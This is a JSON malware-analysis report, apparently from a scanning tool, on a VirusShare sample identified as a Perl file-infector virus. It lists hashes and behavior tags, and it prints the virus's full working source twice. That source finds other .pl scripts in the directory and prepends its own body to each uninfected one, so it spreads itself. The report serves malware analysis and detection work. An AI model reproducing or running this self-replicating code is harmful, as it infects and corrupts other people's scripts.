{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "open": "May open a file",
            "output": "May write to a file",
            "system": "May run an executable file or a system command on a Mac"
        },
        "macro": "#!/usr/bin/perl\n#onehalf3554\n\n#                this perl virus (c)Chernickevich Konstantin\n#                http://onehalf.hotmail.ru\n#                email:onehalf3554@mail.ru\n\n\n\nsystem\"clear\";\n$partone=\"#End_my\";\n$parttwo=\"_body\";\n$EndMarker=$partone.$parttwo;\n$infected=0;\n$BodyCopy=0;\n$textold=\"\";\n\n# this \"while\" for detecting *.pl file\n# and output in the $_ local perl variable\n\nwhile (<*.pl>)\n{\n\n$files=$_;\n$text=\"<\".$_;\n$textw=\">\".$_;\n$textww=\">>\".$_;\n\n\n open(TESTFILE,$text);\n until(eof(TESTFILE))\n        {\n          $strres=readline(TESTFILE);\n\t  \n    \n#               this procedure detecting a marker in the *.pl file\n#      if marker detected then file infected if not then file not infected!\n\n          if ($strres=~ m/onehalf3554/i)\n\t   {\n                  if ($BodyCopy==0)\n\t                 { \n\t                    $BodyCopy=1;\n\t                    open(VIRUSBODY,$text);\n\t                      until ($BodyStr=~ m/$EndMarker/i)\n\t                        {\n\t                         $BodyStr=readline(VIRUSBODY) ;\n\t                         $BodyLoopCount++;\n\t                         $BodyArray[$BodyLoopCount]=$BodyStr; \n\t                        }\n                            close(VIRUSBODY);\n\t                  } \n\t\t\t  $infected=1;\n\t   }\n         }\nclose (TESTFILE);\n\nif ($infected==1)\n{\nprint \"[im detecting old infecting file :]\\n\";\nprint $textw.\" infected old time.[Ok]\\n\";\nopen(RESERVBODY,\">body.bod\");\nprint RESERVBODY @BodyArray;\nclose(RESERVBODY);\n}\n\n\n        if ($infected==0)\n\t{    \n\t               print $textw.\"im trying infecting this file now! \\n\";\n                       system \"cp \".$files.\" temp.bod\";\n\t\t       open(NULFILE,$textww);\n\t\t       $NUL=\"\";\n\t\t       print NULFILE $NUL;\n\t\t       system \"cp body.bod\".\" \".$files; \n                       open(DATAFILE,\"<temp.bod\");\n\t\t       until(eof(DATAFILE))\n\t\t       {\n\t\t       $reloader=readline(DATAFILE);    \t\n\t\t       print NULFILE $reloader;                \n\t\t       }\n\t  close(DATAFILE);\t       \n          close(NULFILE);\n\t}\n\n }\n#End_my_body\n"
    },
    "filename": "VirusShare_3aff38d014a9f34080035c500a371241",
    "filesize": 2121,
    "filetype": "Perl script text executable",
    "hashes": {
        "md5": "3aff38d014a9f34080035c500a371241",
        "sha1": "ac6ed7d1b58f21de5ac4d5f1ef782de60dead82a",
        "sha256": "93d4ec279088bb90f40273a9e1353974e37d2dd9db674cbbdcd5f696e127af49"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#!/usr/bin/perl",
            "#onehalf3554",
            "#                this perl virus (c)Chernickevich Konstantin",
            "#                http://onehalf.hotmail.ru",
            "#                email:onehalf3554@mail.ru",
            "system\"clear\";",
            "$partone=\"#End_my\";",
            "$parttwo=\"_body\";",
            "$EndMarker=$partone.$parttwo;",
            "$infected=0;",
            "$BodyCopy=0;",
            "$textold=\"\";",
            "# this \"while\" for detecting *.pl file",
            "# and output in the $_ local perl variable",
            "while (<*.pl>)",
            "$files=$_;",
            "$text=\"<\".$_;",
            "$textw=\">\".$_;",
            "$textww=\">>\".$_;",
            " open(TESTFILE,$text);",
            " until(eof(TESTFILE))",
            "        {",
            "          $strres=readline(TESTFILE);",
            "    ",
            "#               this procedure detecting a marker in the *.pl file",
            "#      if marker detected then file infected if not then file not infected!",
            "          if ($strres=~ m/onehalf3554/i)",
            "\t   {",
            "                  if ($BodyCopy==0)",
            "\t                 { ",
            "\t                    $BodyCopy=1;",
            "\t                    open(VIRUSBODY,$text);",
            "\t                      until ($BodyStr=~ m/$EndMarker/i)",
            "\t                        {",
            "\t                         $BodyStr=readline(VIRUSBODY) ;",
            "\t                         $BodyLoopCount++;",
            "\t                         $BodyArray[$BodyLoopCount]=$BodyStr; ",
            "\t                        }",
            "                            close(VIRUSBODY);",
            "\t                  } ",
            "\t\t\t  $infected=1;",
            "\t   }",
            "         }",
            "close (TESTFILE);",
            "if ($infected==1)",
            "print \"[im detecting old infecting file :]\\n\";",
            "print $textw.\" infected old time.[Ok]\\n\";",
            "open(RESERVBODY,\">body.bod\");",
            "print RESERVBODY @BodyArray;",
            "close(RESERVBODY);",
            "        if ($infected==0)",
            "\t{    ",
            "\t               print $textw.\"im trying infecting this file now! \\n\";",
            "                       system \"cp \".$files.\" temp.bod\";",
            "\t\t       open(NULFILE,$textww);",
            "\t\t       $NUL=\"\";",
            "\t\t       print NULFILE $NUL;",
            "\t\t       system \"cp body.bod\".\" \".$files; ",
            "                       open(DATAFILE,\"<temp.bod\");",
            "\t\t       until(eof(DATAFILE))",
            "\t\t       {",
            "\t\t       $reloader=readline(DATAFILE);    \t",
            "\t\t       print NULFILE $reloader;                ",
            "\t\t       }",
            "\t  close(DATAFILE);\t       ",
            "          close(NULFILE);",
            "#End_my_body"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://onehalf.hotmail.ru"
        ]
    },
    "time": "0:00:00.280494",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
